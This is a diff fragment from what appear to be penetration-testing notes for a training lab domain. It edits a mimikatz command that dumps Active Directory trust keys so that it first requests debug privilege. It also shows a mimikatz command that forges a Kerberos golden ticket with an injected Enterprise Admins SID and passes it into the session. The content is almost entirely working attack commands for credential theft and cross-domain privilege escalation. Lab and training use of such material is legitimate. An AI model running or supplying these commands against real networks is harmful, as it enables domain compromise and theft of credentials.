@@ -126,7 +126,7 @@ klist
 #### another way 
 
 ```
-mimikatz.exe "lsadump::trust  /patch"
+mimikatz.exe "privilege::debug" "lsadump::trust  /patch"
 
 mimikatz.exe "kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ticket:trustkey.kirbi /ptt"
 
